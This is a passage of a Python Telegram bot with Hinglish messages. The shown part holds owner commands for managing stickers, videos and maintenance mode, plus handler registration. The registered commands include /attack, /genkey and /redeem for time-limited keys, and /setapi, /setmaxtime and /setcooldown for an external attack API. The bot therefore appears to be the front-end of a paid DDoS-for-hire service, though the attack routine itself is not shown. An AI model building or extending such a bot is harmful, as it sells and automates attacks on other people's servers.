    await msg.reply_text(f"✅ Cooldown: {p[1]}s")

async def cmd_maintenance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if not is_owner(msg.from_user.id): return
    cur = get_setting('maintenance_mode', False)
    set_setting("maintenance_mode", not cur)
    await msg.reply_text(f"✅ Maintenance: {'ON' if not cur else 'OFF'}")

# ============= STICKER COMMANDS =============
async def cmd_removesticker(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if not is_owner(msg.from_user.id): return
    if not data["stickers"]:
        await msg.reply_text("❄ Koi sticker nahi hai."); return
    btns = []
    for i, s in enumerate(data["stickers"], 1):
        btns.append([InlineKeyboardButton(f"❌ {i}", callback_data=f"delsticker_{i-1}", style="danger")])
    await msg.reply_text("❄ <b>Click to remove:</b>", reply_markup=InlineKeyboardMarkup(btns), parse_mode="HTML")

async def cmd_liststickers(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if not is_owner(msg.from_user.id): return
    if not data["stickers"]:
        await msg.reply_text("❄ Koi sticker nahi hai."); return
    txt = "❄ 𝗦𝗧𝗜𝗖𝗞𝗘𝗥𝗦\n"
    for i, s in enumerate(data["stickers"], 1):
        txt += f"{i}. {s}\n"
    txt += f"\n🔹 𝗧𝗼𝘁𝗮𝗹 {len(data['stickers'])}"
    await msg.reply_text(txt)

# ============= VIDEO COMMANDS =============
async def cmd_listvideo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if not is_owner(msg.from_user.id): return
    if not data["videos"]:
        await msg.reply_text("📹 Koi video nahi hai."); return
    txt = "📹 🇻 🇮 🇩 🇪 🇴 🇸 ：\n"
    for i, v in enumerate(data["videos"], 1):
        txt += f"🛸{i} {v}\n"
    txt += f"\n⎘ 丅ᗝ丅ᗩᒪ ： {len(data['videos'])}"
    await msg.reply_text(txt)

async def cmd_delvideo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if not is_owner(msg.from_user.id): return
    if not data["videos"]:
        await msg.reply_text("📹 Koi video nahi hai."); return
    btns = []
    for i, v in enumerate(data["videos"], 1):
        btns.append([InlineKeyboardButton(f"❌ {i}", callback_data=f"delvideo_{i-1}", style="danger")])
    await msg.reply_text("📹 <b>Click to remove:</b>", reply_markup=InlineKeyboardMarkup(btns), parse_mode="HTML")

# ============= PYF VIDEO COMMANDS =============
_pending_pyf = {}

async def cmd_addpyf(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if not is_owner(msg.from_user.id): return
    _pending_pyf[msg.from_user.id] = True
    await msg.reply_text("📤 Ab ek <b>video</b> forward karo.", parse_mode="HTML")

async def cmd_listpyf(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if not is_owner(msg.from_user.id): return
    if not data["pyf_videos"]:
        await msg.reply_text("🎬 Koi PYF video nahi hai."); return
    txt = "🎬 🇵 🇾 🇫 🇻 🇮 🇩 🇪 🇴 🇸 ：\n"
    for i, v in enumerate(data["pyf_videos"], 1):
        txt += f"🛸{i} {v}\n"
    txt += f"\n⎘ 丅ᗝ丅ᗩᒪ ： {len(data['pyf_videos'])}"
    await msg.reply_text(txt)

async def cmd_delpyf(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if not is_owner(msg.from_user.id): return
    if not data["pyf_videos"]:
        await msg.reply_text("🎬 Koi PYF video nahi hai."); return
    btns = []
    for i, v in enumerate(data["pyf_videos"], 1):
        btns.append([InlineKeyboardButton(f"❌ {i}", callback_data=f"delpyf_{i-1}", style="danger")])
    await msg.reply_text("🎬 <b>Click to remove:</b>", reply_markup=InlineKeyboardMarkup(btns), parse_mode="HTML")

# ============= CONTENT HANDLERS =============
async def handle_sticker(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    uid = msg.from_user.id
    if not is_owner(uid): return
    file_id = msg.sticker.file_id
    if file_id not in data["stickers"]:
        data["stickers"].append(file_id)
        save_data(data)
        await msg.reply_text(f"✅ Sticker added!\n❄ Total: <b>{len(data['stickers'])}</b>", parse_mode="HTML")
    else:
        await msg.reply_text("ℹ️ Already added.")

async def handle_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    uid = msg.from_user.id
    if not is_owner(uid): return
    file_id = msg.video.file_id

    if _pending_pyf.get(uid):
        _pending_pyf[uid] = False
        if file_id not in data["pyf_videos"]:
            data["pyf_videos"].append(file_id)
            save_data(data)
            await msg.reply_text(f"✅ PYF Video added!\n🎬 Total: <b>{len(data['pyf_videos'])}</b>", parse_mode="HTML")
        else:
            await msg.reply_text("ℹ️ Already added.")
    else:
        if file_id not in data["videos"]:
            data["videos"].append(file_id)
            save_data(data)
            await msg.reply_text(f"✅ Video added!\n📹 Total: <b>{len(data['videos'])}</b>", parse_mode="HTML")
        else:
            await msg.reply_text("ℹ️ Already added.")

async def cmd_settings(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if not is_owner(msg.from_user.id): return
    txt = (
        "⚙️ <b>ALL COMMANDS</b>\n━━━━━━━━━━━━━━━━━━━━━\n\n"
        "👑 <b>OWNER</b>\n/panel /users /stats /broadcast /ban /unban\n\n"
        "🔑 <b>KEY</b>\n/genkey DAYS [AMOUNT]\n/redeem KEY\n\n"
        "📡 <b>API</b>\n/setapi URL TOKEN [method] [geo]\n/testapi\n/setmaxtime SEC\n/setcooldown SEC\n\n"
        "🔧 <b>BOT</b>\n/maintenance\n\n"
        "❄ <b>STICKER</b>\nSend = Auto Add\n/removesticker NUMBER\n/liststickers\n\n"
        "📹 <b>VIDEO</b>\nSend = Auto Add\n/listvideo\n/delvideo NUMBER\n\n"
        "🎬 <b>PYF VIDEO</b>\n/addpyf\n/listpyf\n/delpyf NUMBER"
    )
    await msg.reply_text(txt, parse_mode="HTML")

# ============= MAIN =============
def main():
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
    print("=" * 55)
    print(f"  {BOT_NAME}")
    print("=" * 55)
    print(f"  👑 Owner: {BOT_OWNER}")
    print(f"  ❄ Stickers: {len(data.get('stickers', []))}")
    print(f"  📹 Videos: {len(data.get('videos', []))}")
    print(f"  🎬 PYF Videos: {len(data.get('pyf_videos', []))}")
    print("=" * 55)
    print("  ✅ Bot running...")
    print("=" * 55)

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_start))
    app.add_handler(CommandHandler("attack", cmd_attack))
    app.add_handler(CommandHandler("genkey", cmd_gen))
    app.add_handler(CommandHandler("gen", cmd_gen))
    app.add_handler(CommandHandler("redeem", cmd_redeem))
    app.add_handler(CommandHandler("profile", cmd_profile))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("panel", cmd_panel))
    app.add_handler(CommandHandler("users", cmd_users))
    app.add_handler(CommandHandler("broadcast", cmd_broadcast))
    app.add_handler(CommandHandler("stats", cmd_stats))
    app.add_handler(CommandHandler("ban", cmd_ban))
    app.add_handler(CommandHandler("unban", cmd_unban))
    app.add_handler(CommandHandler("setapi", cmd_setapi))
    app.add_handler(CommandHandler("testapi", cmd_testapi))
    app.add_handler(CommandHandler("setmaxtime", cmd_setmaxtime))
    app.add_handler(CommandHandler("setcooldown", cmd_setcooldown))
    app.add_handler(CommandHandler("maintenance", cmd_maintenance))
    app.add_handler(CommandHandler("removesticker", cmd_removesticker))
    app.add_handler(CommandHandler("liststickers", cmd_liststickers))
    app.add_handler(CommandHandler("listvideo", cmd_listvideo))
    app.add_handler(CommandHandler("delvideo", cmd_delvideo))
    app.add_handler(CommandHandler("addpyf", cmd_addpyf))
    app.add_handler(CommandHandler("listpyf", cmd_listpyf))
    app.add_handler(CommandHandler("delpyf", cmd_delpyf))
    app.add_handler(CommandHandler("settings", cmd_settings))

    # Content handlers — sticker aur video reply ke liye
    app.add_handler(MessageHandler(filters.Sticker.ALL, handle_sticker))
    app.add_handler(MessageHandler(filters.VIDEO, handle_video))

    app.add_handler(CallbackQueryHandler(handle_callback))

    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
